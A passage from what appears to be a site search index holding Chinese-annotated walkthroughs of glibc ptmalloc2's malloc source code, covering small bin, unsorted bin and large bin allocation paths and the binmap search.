\u68c0\u67e5 bck->fd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020 if (__glibc_unlikely(bck->fd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } // \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d set_inuse_bit_at_offset(victim, nb); // \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765 bin->bk = bck; bck->fd = bin; // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if (av != &main_arena) set_non_main_arena(victim); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk(av, victim, nb); // \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001 void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } } }","title":"small bin"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_3","text":"malloc \u53c2\u6570\u662f\u65e0\u7b26\u53f7\u957f\u6574\u578b smallbin \u662f\u4ece\u6700\u540e\u7ed3\u70b9\uff08\u6700\u5148\u8fdb\u5165\uff09\u5f00\u59cb\u53d6 chunk \uff0c\u7b26\u5408\u201c\u5148\u8fdb\u5148\u51fa\u201d","title":"\u5c0f\u603b\u7ed3"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#small-bin-malloc","text":"\u6b65\u9aa4\u5982\u4e0b\uff1a bck = victim->bk; | (bck->fd != victim) \uff1a\u68c0\u67e5\u5373\u5c06\u5206\u914d\u7684\u7684 victim \u7684\u4e0a\u4e00\u4e2a chunk \u7684 fd \u6307\u9488\u662f\u5426\u6307\u5411 victim \u9632\u6b62\u4f2a\u9020 set_inuse_bit_at_offset(victim, nb); \uff1a\u4fee\u6539 victim \u7684 size inuse \u4f4d bin->bk = bck; | bck->fd = bin; \uff1a\u4fee\u6539\u94fe\u8868\u5c06 victime \u53d6\u51fa\u6765\uff08small bin \u6700\u540e\u4e00\u4e2a\uff09","title":"small bin malloc \u68c0\u67e5\u673a\u5236"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#large-bin","text":"\u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684 chunk\uff0c\u800c\u662f \u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1 malloc_state \u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684 chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d \uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002 \u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662f ptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002 /* If this is a large request, consolidate fastbins before continuing. While it might look excessive to kill all fastbins before even seeing if there is space available, this avoids fragmentation problems normally associated with fastbins. Also, in practice, programs tend to have runs of either small or large requests, but less often mixtures, so consolidation is not invoked all that often in most programs. And the programs that it is called frequently in otherwise tend to fragment. */ else { // \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002 idx = largebin_index(nb); // \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin if (have_fastchunks(av)) malloc_consolidate(av); }","title":"large bin"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#-unsorted-bin","text":"2020.07.08 largebin \u5206\u914d\u673a\u5236\u4e0d\u592a\u660e\u767d \u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk \u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662f large chunk \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406 \u3002 \u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c \u6309\u7167 FIFO \u7684\u65b9\u5f0f\u9010\u4e2a\u5c06 unsorted bin \u4e2d\u7684 chunk \u53d6\u51fa\u6765 \u5982\u679c\u662f small request\uff0c\u5219\u8003\u8651\u662f\u4e0d\u662f\u6070\u597d\u6ee1\u8db3\uff0c\u662f\u7684\u8bdd\uff0c\u76f4\u63a5\u8fd4\u56de\u3002 \u5982\u679c\u4e0d\u662f\u7684\u8bdd\uff0c\u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\u3002 \u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58 \u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9 fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914d small bin chunk\u3002 /* Process recently freed or remaindered chunks, taking one only if it is exact fit, or, if this a small request, the chunk is remainder from the most recent non-exact fit. Place other traversed chunks in bins. Note that this step is the only place in any routine where chunks are placed in bins. The outer loop here is needed because we might not realize until near the end of malloc that we should have consolidated, so must do so and retry. This happens at most once, and only when we would otherwise need to expand memory to service a \"small\" request. */ for (;;) { int iters = 0;","title":"\u5927\u5faa\u73af - \u904d\u5386 unsorted bin"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#unsorted-bin","text":"\u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8e small bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002 \u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002 // \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a // First In First Out while ((victim = unsorted_chunks(av)->bk) != unsorted_chunks(av)) { // victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk // bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk bck = victim->bk; // \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927 // \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K if (__builtin_expect(chunksize_nomask(victim) <= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize_nomask(victim) > av->system_mem, 0)) malloc_printerr(check_action, \"malloc(): memory corruption\", chunk2mem(victim), av); // \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002 size = chunksize(victim);","title":"unsorted bin \u904d\u5386"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#small-request","text":"\u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk \uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u540e\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c \u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7 \uff1f /* If a small request, try to use last remainder if it is the only chunk in unsorted bin. This helps promote locality for runs of consecutive small requests. This is the only exception to best-fit, and applies only when there is no exact fit for a small chunk. */ //\u662f\u5426\u662fsmallbin\u8303\u56f4\uff1bbck\u662f\u5426\u662f\u94fe\u9996\uff1bremainder\u662f\uff08\u5206\u914d\u5b8c\uff09\u5269\u4f59\u90e8\u5206 if (in_smallbin_range(nb) && bck == unsorted_chunks(av) && victim == av->last_remainder && (unsigned long) (size) > (unsigned long) (nb + MINSIZE)) { /* split and reattach remainder */ // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f remainder_size = size - nb; // \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e remainder = chunk_at_offset(victim, nb); // \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5 // av\u662f\u88ab\u53d6\u51fachunk\u7684\u4e0b\u4e00\u4e2achunk\uff08fd\uff09 unsorted_chunks(av)->bk = unsorted_chunks(av)->fd = remainder; // \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder av->last_remainder = remainder; // \u66f4\u65b0last remainder\u7684\u6307\u9488 remainder->bk = remainder->fd = unsorted_chunks(av); if (!in_smallbin_range(remainder_size)) { remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } // \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0cinuse set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); // \u8bbe\u7f6e remainder \u7684\u5934\u90e8 set_head(remainder, remainder_size | PREV_INUSE); // \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002 set_foot(remainder, remainder_size); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk(av, victim, nb); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; }","title":"SMALL REQUEST"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_4","text":"/* remove from unsorted list */ //\u4fee\u6539 unsortedchunk \u94fe\u8868 unsorted_chunks(av)->bk = bck; bck->fd = unsorted_chunks(av);","title":"\u521d\u59cb\u53d6\u51fa"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#chunk-exact-fit","text":"\u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002 /* Take now instead of binning if exact fit */ if (size == nb) {//\u5927\u5c0f\u6b63\u597d\u5408\u9002 set_inuse_bit_at_offset(victim, size); // \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7 if (av != &main_arena) set_non_main_arena(victim); // \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528 check_malloced_chunk(av, victim, nb); // \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); //\u76f4\u63a5\u8fd4\u56de chunk \u6307\u9488 return p; }","title":"\u53d6\u51fa chunk \u5927\u5c0f\u521a\u597d\u5408\u9002 \uff08EXACT FIT\uff09"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#chunk-smallbin-place-chunk-in-small-bin","text":"\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 small bin \u4e2d\u3002 /* place chunk in bin */ //\u5224\u65ad size \u662f\u5426\u5728smallbin if (in_smallbin_range(size)) { // \u83b7\u53d6 small bin \u7684\u7d22\u5f15 victim_index = smallbin_index(size); // \u8c03\u6574 small bin \u7684\u94fe\u8868 bck = bin_at(av, victim_index); fwd = bck->fd;","title":"\u5c06\u53d6\u51fa\u6765 chunk \u653e\u5165\u5230 smallbin \uff08PLACE CHUNK IN SMALL BIN\uff09"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#place-chunk-in-large-bin","text":"\u628a\u53d6\u51fa\u6765\u7684 chunk \u653e\u5230\u5bf9\u5e94\u7684 large bin \u4e2d\u3002 \u8fd9\u91cc\u5e94\u8be5\u662f\u83b7\u53d6\u6b63\u786e\u63d2\u5165\u4f4d\u7f6e\u7684\u6307\u9488 bck\u3001fwd\u3002\u6700\u540e\u63d2\u5165\u5f62\u5f0f\u4e3a\uff1abck<-->victim<-->fwd\u3002 \u94fe\u8868\u6784\u5efa\u5728\uff1a \u6700\u7ec8\u53d6\u51fa } else { // large bin \u8303\u56f4 victim_index = largebin_index(size); bck = bin_at(av, victim_index); // \u5f53\u524d large bin \u7684\u5934\u90e8 fwd = bck->fd; /* maintain large bins in sorted order */ /* \u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u603b\u7ed3\u51fa\uff0clargebin \u4ee5 fd_nextsize \u9012\u51cf\u6392\u5e8f\u3002 \u540c\u6837\u5927\u5c0f\u7684 chunk\uff0c\u540e\u6765\u7684\u53ea\u4f1a\u63d2\u5165\u5230\u4e4b\u524d\u540c\u6837\u5927\u5c0f\u7684 chunk \u540e\uff0c \u800c\u4e0d\u4f1a\u4fee\u6539\u4e4b\u524d\u76f8\u540c\u5927\u5c0f\u7684fd/bk_nextsize\uff0c\u8fd9\u4e5f\u5f88\u5bb9\u6613\u7406\u89e3\uff0c \u53ef\u4ee5\u51cf\u4f4e\u5f00\u9500\u3002\u6b64\u5916\uff0cbin \u5934\u4e0d\u53c2\u4e0e nextsize \u94fe\u63a5\u3002*/ // \u5982\u679c large bin \u94fe\u8868\u4e0d\u7a7a if (fwd != bck) { /* Or with inuse bit to speed comparisons */ // \u52a0\u901f\u6bd4\u8f83\uff0c\u5e94\u8be5\u4e0d\u4ec5\u4ec5\u6709\u8fd9\u4e2a\u8003\u8651\uff0c\u56e0\u4e3a\u94fe\u8868\u91cc\u7684 chunk \u90fd\u4f1a\u8bbe\u7f6e\u8be5\u4f4d\u3002 size |= PREV_INUSE; /* if smaller than smallest, bypass loop below */ // bck->bk \u5b58\u50a8\u7740\u76f8\u5e94 large bin \u4e2d\u6700\u5c0f\u7684chunk\u3002 // \u5982\u679c\u904d\u5386\u7684 chunk \u6bd4\u5f53\u524d\u6700\u5c0f\u7684\u8fd8\u8981\u5c0f\uff0c\u90a3\u5c31\u53ea\u9700\u8981\u63d2\u5165\u5230\u94fe\u8868\u5c3e\u90e8\u3002 // \u5224\u65ad bck->bk \u662f\u4e0d\u662f\u5728 main arena\u3002 assert(chunk_main_arena(bck->bk)); if ((unsigned long) (size) < (unsigned long) chunksize_nomask(bck->bk)) { // \u4ee4 fwd \u6307\u5411 large bin \u5934 fwd = bck; // \u4ee4 bck \u6307\u5411 largin bin \u5c3e\u90e8 chunk bck = bck->bk; // victim \u7684 fd_nextsize \u6307\u5411 largin bin \u7684\u7b2c\u4e00\u4e2a chunk victim->fd_nextsize = fwd->fd; // victim \u7684 bk_nextsize \u6307\u5411\u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u6307\u5411\u7684 bk_nextsize victim->bk_nextsize = fwd->fd->bk_nextsize; // \u539f\u6765\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a chunk \u7684 bk_nextsize \u6307\u5411 victim // \u539f\u6765\u6307\u5411\u94fe\u8868\u7b2c\u4e00\u4e2a chunk \u7684 fd_nextsize \u6307\u5411 victim fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; } else { // \u5f53\u524d\u8981\u63d2\u5165\u7684 victim \u7684\u5927\u5c0f\u5927\u4e8e\u6700\u5c0f\u7684 chunk // \u5224\u65ad fwd \u662f\u5426\u5728 main arena assert(chunk_main_arena(fwd)); // \u4ece\u94fe\u8868\u5934\u90e8\u5f00\u59cb\u627e\u5230\u4e0d\u6bd4 victim \u5927\u7684 chunk while ((unsigned long) size < chunksize_nomask(fwd)) { fwd = fwd->fd_nextsize; assert(chunk_main_arena(fwd)); } // \u5982\u679c\u627e\u5230\u4e86\u4e00\u4e2a\u548c victim \u4e00\u6837\u5927\u7684 chunk\uff0c // \u90a3\u5c31\u76f4\u63a5\u5c06 chunk \u63d2\u5165\u5230\u8be5chunk\u7684\u540e\u9762\uff0c\u5e76\u4e0d\u4fee\u6539 nextsize \u6307\u9488\u3002 if ((unsigned long) size == (unsigned long) chunksize_nomask(fwd)) /* Always insert in the second position. */ fwd = fwd->fd; else { // \u5982\u679c\u627e\u5230\u7684chunk\u548c\u5f53\u524dvictim\u5927\u5c0f\u4e0d\u4e00\u6837 // \u90a3\u4e48\u5c31\u9700\u8981\u6784\u9020 nextsize \u53cc\u5411\u94fe\u8868\u4e86 victim->fd_nextsize = fwd; victim->bk_nextsize = fwd->bk_nextsize; fwd->bk_nextsize = victim; victim->bk_nextsize->fd_nextsize = victim; } bck = fwd->bk; } } else // \u5982\u679c\u7a7a\u7684\u8bdd\uff0c\u76f4\u63a5\u7b80\u5355\u4f7f\u5f97 fd_nextsize \u4e0e bk_nextsize \u6784\u6210\u4e00\u4e2a\u53cc\u5411\u94fe\u8868\u5373\u53ef\u3002 victim->fd_nextsize = victim->bk_nextsize = victim; }","title":"PLACE CHUNK IN LARGE BIN"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#_5","text":"// \u653e\u5230\u5bf9\u5e94\u7684 bin \u4e2d\uff0c\u6784\u6210 bck<-->victim<-->fwd\u3002 mark_bin(av, victim_index); victim->bk = bck; victim->fd = fwd; fwd->bk = victim; bck->fd = victim;","title":"\u6700\u7ec8\u53d6\u51fa"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#while","text":"while \u6700\u591a\u8fed\u4ee3 10000 \u6b21\u540e\u9000\u51fa\u3002 // #define MAX_ITERS 10000 if (++iters >= MAX_ITERS) break; }","title":"WHILE \u8fed\u4ee3\u6b21\u6570"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#large-chunk","text":"\u6ce8\uff1a \u6216\u8bb8\u4f1a\u5f88\u5947\u602a\uff0c\u4e3a\u4ec0\u4e48\u8fd9\u91cc\u6ca1\u6709\u5148\u53bb\u770b small chunk \u662f\u5426\u6ee1\u8db3\u65b0\u9700\u6c42\u4e86\u5462\uff1f\u8fd9\u662f\u56e0\u4e3a small bin \u5728\u5faa\u73af\u4e4b\u524d\u5df2\u7ecf\u5224\u65ad\u8fc7\u4e86\uff0c\u8fd9\u91cc\u5982\u679c\u6709\u7684\u8bdd\uff0c\u5c31\u662f\u5408\u5e76\u540e\u7684\u624d\u51fa\u73b0 chunk\u3002\u4f46\u662f\u5728\u5927\u5faa\u73af\u5916\uff0clarge chunk \u53ea\u662f\u5355\u7eaf\u5730\u627e\u5230\u5176\u7d22\u5f15\uff0c\u6240\u4ee5\u89c9\u5f97\u5728\u8fd9\u91cc\u76f4\u63a5\u5148\u5224\u65ad\u662f\u5408\u7406\u7684\uff0c\u800c\u4e14\u4e5f\u4e3a\u4e86\u4e0b\u9762\u53ef\u4ee5\u518d\u53bb\u627e\u8f83\u5927\u7684 chunk\u3002 \u5982\u679c\u8bf7\u6c42\u7684 chunk \u5728 large chunk \u8303\u56f4\u5185\uff0c\u5c31\u5728\u5bf9\u5e94\u7684 bin \u4e2d\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u626b\u63cf\uff0c\u627e\u5230\u7b2c\u4e00\u4e2a\u5408\u9002\u7684\u3002 /* If a large request, scan through the chunks of current bin in sorted order to find smallest that fits. Use the skip list for this. */ //\u5224\u65ad\u662f\u5426smallbin if (!in_smallbin_range(nb)) { bin = bin_at(av, idx); /* skip scan if empty or largest chunk is too small */ // \u5982\u679c\u5bf9\u5e94\u7684 bin \u4e3a\u7a7a\u6216\u8005\u5176\u4e2d\u7684chunk\u6700\u5927\u7684\u4e5f\u5f88\u5c0f\uff0c\u90a3\u5c31\u8df3\u8fc7 // first(bin)=bin->fd \u8868\u793a\u5f53\u524d\u94fe\u8868\u4e2d\u6700\u5927\u7684chunk if ((victim = first(bin)) != bin && (unsigned long) chunksize_nomask(victim) >= (unsigned long) (nb)) { // \u53cd\u5411\u904d\u5386\u94fe\u8868\uff0c\u76f4\u5230\u627e\u5230\u7b2c\u4e00\u4e2a\u4e0d\u5c0f\u4e8e\u6240\u9700chunk\u5927\u5c0f\u7684chunk victim = victim->bk_nextsize; while (((unsigned long) (size = chunksize(victim)) < (unsigned long) (nb))) victim = victim->bk_nextsize; /* Avoid removing the first entry for a size so that the skip list does not have to be rerouted. */ // \u5982\u679c\u6700\u7ec8\u53d6\u5230\u7684chunk\u4e0d\u662f\u8be5bin\u4e2d\u7684\u6700\u540e\u4e00\u4e2achunk\uff0c\u5e76\u4e14\u8be5chunk\u4e0e\u5176\u524d\u9762\u7684chunk // \u7684\u5927\u5c0f\u76f8\u540c\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53d6\u5176\u524d\u9762\u7684chunk\uff0c\u8fd9\u6837\u53ef\u4ee5\u907f\u514d\u8c03\u6574bk_nextsize,fd_nextsize // \u94fe\u8868\u3002\u56e0\u4e3a\u5927\u5c0f\u76f8\u540c\u7684chunk\u53ea\u6709\u4e00\u4e2a\u4f1a\u88ab\u4e32\u5728nextsize\u94fe\u4e0a\u3002 if (victim != last(bin) && chunksize_nomask(victim) == chunksize_nomask(victim->fd)) victim = victim->fd; // \u8ba1\u7b97\u5206\u914d\u540e\u5269\u4f59\u7684\u5927\u5c0f remainder_size = size - nb; // \u8fdb\u884cunlink\uff08\u5b8f\u64cd\u4f5c\uff09 unlink(av, victim, bck, fwd); /* Exhaust */ // \u5269\u4e0b\u7684\u5927\u5c0f\u4e0d\u8db3\u4ee5\u5f53\u505a\u4e00\u4e2a\u5757 // \u5f88\u597d\u5947\u63a5\u4e0b\u6765\u4f1a\u600e\u4e48\u529e\uff1f if (remainder_size < MINSIZE) { set_inuse_bit_at_offset(victim, size); if (av != &main_arena) set_non_main_arena(victim); } /* Split */ // \u5269\u4e0b\u7684\u5927\u5c0f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2achunk\uff0c\u8fdb\u884c\u5206\u5272\u3002 else { // \u83b7\u53d6\u5269\u4e0b\u90a3\u90e8\u5206chunk\u7684\u6307\u9488\uff0c\u79f0\u4e3aremainder remainder = chunk_at_offset(victim, nb); /* We cannot assume the unsorted list is empty and therefore have to perform a complete insert here. */ // \u63d2\u5165unsorted bin\u4e2d bck = unsorted_chunks(av); fwd = bck->fd; // \u5224\u65ad unsorted bin \u662f\u5426\u88ab\u7834\u574f\u3002 if (__glibc_unlikely(fwd->bk != bck)) { errstr = \"malloc(): corrupted unsorted chunks\"; goto errout; } remainder->bk = bck; remainder->fd = fwd; bck->fd = remainder; fwd->bk = remainder; // \u5982\u679c\u4e0d\u5904\u4e8esmall bin\u8303\u56f4\u5185\uff0c\u5c31\u8bbe\u7f6e\u5bf9\u5e94\u7684\u5b57\u6bb5 if (!in_smallbin_range(remainder_size)) { remainder->fd_nextsize = NULL; remainder->bk_nextsize = NULL; } // \u8bbe\u7f6e\u5206\u914d\u7684chunk\u7684\u6807\u8bb0 set_head(victim, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0)); // \u8bbe\u7f6eremainder\u7684\u4e0a\u4e00\u4e2achunk\uff0c\u5373\u5206\u914d\u51fa\u53bb\u7684chunk\u7684\u4f7f\u7528\u72b6\u6001 // \u5176\u4f59\u7684\u4e0d\u7528\u7ba1\uff0c\u76f4\u63a5\u4ece\u4e0a\u9762\u7ee7\u627f\u4e0b\u6765\u4e86 set_head(remainder, remainder_size | PREV_INUSE); // \u8bbe\u7f6eremainder\u7684\u5927\u5c0f set_foot(remainder, remainder_size); } // \u68c0\u67e5 check_malloced_chunk(av, victim, nb); // \u8f6c\u6362\u4e3amem\u72b6\u6001 void *p = chunk2mem(victim); // \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff alloc_perturb(p, bytes); return p; } }","title":"large chunk"},{"location":"glibc-heap/depth-Understanding-Ptmalloc2/malloc/#chunk","text":"\u5982\u679c\u8d70\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u8bf4\u660e\u5bf9\u4e8e\u7528\u6237\u6240\u9700\u7684 chunk\uff0c\u4e0d\u80fd\u76f4\u63a5\u4ece\u5176\u5bf9\u5e94\u7684\u5408\u9002\u7684 bin \u4e2d\u83b7\u53d6 chunk [^1]\uff0c\u6240\u4ee5\u6211\u4eec\u9700\u8981\u6765\u67e5\u627e\u6bd4\u5f53\u524d bin \u66f4\u5927\u7684 fast bin \uff0c small bin \u6216\u8005 large bin\u3002 [^1]:\u8fd9\u91cc\u610f\u601d\u662f\u53bb\u5bf9\u5e94 bin \u53d6\uff0c\u6ca1\u6709\u529e\u6cd5\u53d6\u5230\u3002\u6bd4\u5982\u9700\u8981\u4e00\u4e2a 0x100 \u7684chunk \uff0c\u53bb\u5230\u5927\u5c0f\u4e3a 0x100 \u7684bin \u4e2d\u53d6\uff0c\u800c\u8be5 bin \u4e2d\u6ca1\u6709\u7a7a\u95f2 chunk \u3002 /* Search for a chunk by scanning bins, starting with next largest bin. This search is strictly by best-fit; i.e., the smallest (with ties going to approximately the least recently used) chunk that fits is selected. The bitmap avoids needing to check that most blocks are nonempty. The particular case of skipping all bins during warm-up phases when no chunks have been returned yet is faster than it might look. */ ++idx; // \u83b7\u53d6\u5bf9\u5e94\u7684bin bin = bin_at(av, idx); // \u83b7\u53d6\u5f53\u524d\u7d22\u5f15\u5728binmap\u4e2d\u7684block\u7d22\u5f15 // #define idx2block(i) ((i) >> BINMAPSHIFT) ,BINMAPSHIFT=5 // Binmap\u6309block\u7ba1\u7406\uff0c\u6bcf\u4e2ablock\u4e3a\u4e00\u4e2aint\uff0c\u517132\u4e2abit\uff0c\u53ef\u4ee5\u8868\u793a32\u4e2abin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2chunk\u5b58\u5728 // \u6240\u4ee5\u8fd9\u91cc\u662f\u53f3\u79fb5 block = idx2block(idx); // \u83b7\u53d6\u5f53\u524d\u5757\u5927\u5c0f\u5bf9\u5e94\u7684\u6620\u5c04\uff0c\u8fd9\u91cc\u53ef\u4ee5\u5f97\u77e5\u76f8\u5e94\u7684bin\u4e2d\u662f\u5426\u6709\u7a7a\u95f2\u5757 map = av->binmap[ block ]; // #define idx2bit(i) ((1U << ((i) & ((1U << 